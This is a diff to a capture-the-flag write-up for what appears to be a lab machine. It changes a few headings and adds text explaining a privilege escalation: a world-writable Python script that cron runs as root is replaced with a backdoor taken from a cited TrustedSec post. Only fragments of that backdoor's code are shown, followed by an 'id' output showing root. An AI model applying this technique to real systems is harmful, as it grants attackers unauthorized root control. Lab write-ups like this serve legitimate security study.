@@ -35,7 +35,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
 ```
-#### HTTP Enumeration
+# HTTP Enumeration
 ```
 3128/tcp open   http-proxy Squid http proxy 3.1.19
 ```
@@ -102,7 +102,12 @@ According to this, it connects to things frequently, fortunately we have write a
 ls -l /var/www/connect.py
 -rwxrwxrwx 1 root root 109 Dec  5  2015 /var/www/connect.py
 ```
-We can completely replace the file with an exploit named connect.py
+As cronjobs are usually run as root ,We can completely replace the file with an exploit named connect.py and hopefully create a shell with root.
+
+
+# Exploit 
+
+Replace the file with an exploit of our own 
 From https://www.trustedsec.com/2011/06/creating-a-13-line-backdoor-worry-free-of-av/
 ```
 #!/usr/bin/python
@@ -131,8 +136,7 @@ while 1:
 s.close()
 
 ```
-
-Root
+Wait and Root
 ```
 id
 uid=0(root) gid=0(root) groups=0(root)
